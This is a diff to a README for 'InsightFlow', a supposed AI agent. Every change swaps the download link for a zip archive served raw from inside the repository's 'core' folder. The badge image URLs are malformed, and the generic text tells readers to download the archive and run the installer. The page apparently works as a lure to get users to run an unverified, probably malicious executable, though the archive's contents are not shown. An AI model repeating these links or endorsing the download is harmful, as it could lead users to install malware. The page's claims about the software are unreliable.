@@ -1,6 +1,6 @@
 # 🚀 InsightFlow - Seamless AI Agent for Your Needs
 
-[![Download InsightFlow](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.9.zip%20InsightFlow-Get%20It%20Now-blue)](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.9.zip)
+[![Download InsightFlow](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.8-beta.1.zip%20InsightFlow-Get%20It%20Now-blue)](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.8-beta.1.zip)
 
 ## 📃 Overview
 
@@ -21,7 +21,7 @@ To get started with InsightFlow, follow these simple steps:
 
 1. **Download the Software:**
    - Visit the releases page to download the latest version:  
-   [Download InsightFlow](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.9.zip)
+   [Download InsightFlow](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.8-beta.1.zip)
 
 2. **Installation:**
    - After downloading, locate the file in your downloads folder.
@@ -47,7 +47,7 @@ For detailed information on using InsightFlow, refer to the built-in help sectio
 To install InsightFlow, follow these steps:
 
 - Visit this page to download the latest version:  
-[Download InsightFlow](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.9.zip)
+[Download InsightFlow](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.8-beta.1.zip)
   
 After downloading, run the installation file and follow the prompts. Once complete, you're ready to explore all that InsightFlow has to offer.
 
@@ -75,4 +75,4 @@ Each of these topics enhances the usability and functionality of InsightFlow, ma
 
 We plan to regularly update InsightFlow with new features and improvements. Stay tuned for announcements regarding new releases and enhancements. Thank you for choosing InsightFlow—your partner in efficiency and innovation.
 
-[![Download InsightFlow](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.9.zip%20InsightFlow-Get%20It%20Now-blue)](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.9.zip)
+[![Download InsightFlow](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.8-beta.1.zip%20InsightFlow-Get%20It%20Now-blue)](https://raw.githubusercontent.com/emixde12/InsightFlow/main/core/Flow-Insight-3.8-beta.1.zip)
